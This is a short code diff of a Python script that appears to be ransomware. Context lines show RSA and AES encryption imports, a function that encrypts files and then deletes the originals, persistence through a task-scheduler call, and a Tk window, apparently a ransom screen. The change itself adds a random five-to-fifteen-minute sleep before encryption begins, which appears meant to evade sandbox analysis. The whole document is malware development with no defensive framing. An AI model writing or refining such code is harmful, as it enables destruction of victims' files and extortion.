@@ -1,5 +1,8 @@
 import os
+import random
 import secrets
+import time
+
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -123,6 +126,9 @@ def encrypt_file():
                     os.remove(filePath)
 
 if __name__ == "__main__":
+    time.sleep(random.randint(300,900))
+
+
     encrypt_file()
     add_to_task_scheduler()
     root = tk.Tk()
